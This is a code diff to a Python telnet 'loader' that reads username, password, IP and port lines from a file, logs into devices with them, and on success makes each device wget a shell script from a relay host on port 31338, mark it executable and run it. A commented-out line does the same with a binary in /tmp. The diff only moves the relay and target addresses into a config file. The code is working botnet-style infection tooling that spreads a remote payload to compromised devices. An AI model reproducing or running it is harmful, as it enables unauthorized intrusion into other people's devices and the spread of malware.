@@ -6,14 +6,13 @@ import time
 from libs import truecolors
 import paramiko
 Host_IP = ""
+filename = 'ip_config.ini'
+with open(filename, 'r') as file:
+    json_data = json.load(file)
+Host_IP = json_data['RelayIP']
+targetIP = json_data['targetIP']
+Host_IP+=":31338"
 
-def read_config_ip():
-    filename = 'ip_config.ini'
-    with open(filename, 'r') as file:
-        json_data = json.load(file)
-    RelayIP = json_data['RelayIP']
-    targetIP = json_data['targetIP']
-    return RelayIP, targetIP
 
 def doTelnetLogin(ip, port, user, pass_):
     tn = None
@@ -49,7 +48,7 @@ def doTelnetLogin(ip, port, user, pass_):
                     print("[loader] Login succeeded %s " % ip +" --> "+ ' : '.join((user, password)))
                     response = tn.read_until(b"#", 1)
                     #tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;" % (__bin__,os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
-                    cmd="wget http://192.168.1.97:31338/wget_download_exec.sh"
+                    cmd="wget "+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
                     cmd1="chmod +x wget_download_exec.sh"
                     cmd2="sh ./wget_download_exec.sh"
                     tn.write((cmd+"\n").encode('ascii'))  
@@ -94,12 +93,6 @@ def ForceDB(fname):
             with open(fname) as f:
                 for line in f:
                     usr,psw,ip,port = line.split(":")
-                    '''
-                    usr = line.split(':')[0].rstrip()
-                    psw = line.split(':')[1].rstrip()
-                    ip = line.split(':')[2].rstrip()
-                    port = line.split(':')[3].rstrip()
-                    '''
                     doTelnetLogin(ip, port, usr, psw)
         else:
             truecolors.print_errn("Loader: File '%s' doesn't exists, check the path." % fname)
